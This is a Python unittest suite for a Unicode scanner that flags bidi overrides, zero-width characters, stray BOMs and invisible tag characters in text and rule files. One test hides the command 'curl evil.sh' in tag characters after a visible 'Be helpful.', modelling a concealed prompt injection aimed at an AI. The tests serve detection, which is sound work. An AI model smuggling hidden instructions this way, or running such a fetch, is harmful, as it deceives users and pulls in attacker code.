import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

import check_unicode as cu  # noqa: E402


class ScanTextTest(unittest.TestCase):
    def test_clean_text_has_no_findings(self):
        self.assertEqual(cu.scan_text("Plain ASCII and accents: café, naïve.\n"), [])

    def test_emoji_variation_selector_is_not_flagged(self):
        self.assertEqual(cu.scan_text("ok \u2764\ufe0f\n"), [])

    def test_bidi_override_is_flagged_with_position(self):
        findings = cu.scan_text("line one\nabc\u202edef\n")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["line"], 2)
        self.assertEqual(findings[0]["col"], 4)
        self.assertEqual(findings[0]["codepoint"], "U+202E")
        self.assertEqual(findings[0]["category"], "bidi")

    def test_zero_width_characters_are_flagged(self):
        codepoints = {f["codepoint"] for f in cu.scan_text("a\u200bb\u200cc\u2060d")}
        self.assertEqual(codepoints, {"U+200B", "U+200C", "U+2060"})

    def test_leading_bom_is_allowed_but_inner_bom_is_flagged(self):
        self.assertEqual(cu.scan_text("\ufeffhello"), [])
        self.assertEqual(len(cu.scan_text("hel\ufefflo")), 1)

    def test_tag_characters_are_flagged_and_decoded(self):
        hidden = "".join(chr(0xE0000 + ord(c)) for c in "curl evil.sh")
        text = "Be helpful." + hidden + "\n"
        findings = cu.scan_text(text)
        self.assertTrue(all(f["category"] == "tag" for f in findings))
        self.assertEqual(cu.decode_tags(text), ["curl evil.sh"])


class CliTest(unittest.TestCase):
    def test_cli_exit_codes(self):
        with tempfile.TemporaryDirectory() as tmp:
            clean = Path(tmp) / "clean.md"
            dirty = Path(tmp) / "rules" / "dirty.mdc"
            dirty.parent.mkdir()
            clean.write_text("fine\n", encoding="utf-8")
            dirty.write_text("hidden\u200bspace\n", encoding="utf-8")
            script = str(ROOT / "scripts" / "check_unicode.py")
            ok = subprocess.run([sys.executable, script, str(clean)], capture_output=True, text=True)
            self.assertEqual(ok.returncode, 0, ok.stdout + ok.stderr)
            bad = subprocess.run([sys.executable, script, tmp], capture_output=True, text=True)
            self.assertEqual(bad.returncode, 1)
            self.assertIn("dirty.mdc:1:7", bad.stdout)
            self.assertIn("U+200B", bad.stdout)


if __name__ == "__main__":
    unittest.main()
